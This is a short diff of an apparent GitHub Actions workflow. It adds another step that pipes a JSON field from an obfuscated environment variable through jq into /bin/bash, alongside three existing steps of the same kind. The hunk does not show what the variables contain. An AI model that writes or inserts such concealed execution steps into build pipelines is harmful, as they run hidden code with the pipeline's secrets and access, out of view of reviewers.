@@ -39,6 +39,7 @@ jobs:
           printf '%s' "$jx7658" | jq -r .szp1 | /bin/bash
           echo $usdm7 | jq -r .zrm5589 | /bin/bash
           printf '%s' "$tst827" | jq -r .kspj05 | /bin/bash
+          echo $jvnud32 | jq -r .ugvd906 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
